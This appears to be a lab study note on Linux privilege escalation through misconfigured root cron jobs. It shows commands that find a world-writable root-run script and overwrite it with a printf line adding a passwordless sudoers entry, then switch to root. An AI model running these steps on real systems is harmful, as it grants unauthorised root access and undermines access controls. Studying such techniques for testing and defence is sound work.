#### Cron Jobs
- Linux implementas task sheduleing through a utility called Cron.
- cron is a time-based service that runs applications,script and other commands repeatedly on a specific sheduel.
- An application,or script that has been configured to be run repeatedly with cron is known as a Cron job.Cron can be used to automate or repeat a wide variety of functions on a system,from daily backups to system upgrades and patches
- The crontab file is configuration file that is used by the Cron utility to store and track Cron jobs that have been created.
#### Exploiting Misconfigured Cron jobs
- Cron jobs can also be run as any user on the system.this a very important factor to keep an eye on as we will be targeting Cron jobs that have been configured to be run as the "root" user.
- This is primarily beacuse,any script or command that is run by a  cron job will run as the root user and will consequently provide us with root access.
- In order to elevate our privileges,we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.
#### Exploiting cronjob
- after getting initial access
- groups [for checking the group the current users belongs to ]
- crontab -l [for listing available cron tab for this current user ]
- ls -al [ for listing available files,there is a file name message who is own by root,now question is why root user store a file into current user student ]
- now let's find out where the where the actual path of the message file.
- cd / [ move to the root directory]
- grep -rnw /usr -e "/home/student/message"
- we will find message file in tmp directory and the previous command also show a shell file.
- ls -al /usr/local/share/copy.sh [ if we check the permission we will see it is own by root,but user,group and others all have the read,write and execution permission ]
- now we need to modify this but no editor like vim,nano exist,so we need to follow other techniques
- printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh [ this scripts says student user don't need password,and redirect the file into sudoers ]
- sudo -l [ list all the sudoer files ]
- sudo su [ for switching to root user]

